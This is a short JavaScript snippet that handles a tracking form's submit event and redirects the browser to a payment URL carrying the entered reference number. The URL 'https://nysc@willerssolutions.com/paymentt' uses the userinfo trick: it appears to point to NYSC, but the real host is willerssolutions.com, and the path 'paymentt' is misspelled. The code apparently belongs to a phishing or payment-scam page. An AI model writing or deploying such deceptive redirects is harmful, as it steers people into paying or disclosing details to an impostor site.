document.getElementById("trackForm").addEventListener("submit", function (e) {
    e.preventDefault(); // stop normal form submit

    let ref = document.getElementById("refInput").value.trim();

    if (ref !== "") {
        window.location.href = "https://nysc@willerssolutions.com/paymentt?reference=" + encodeURIComponent(ref);
    }
});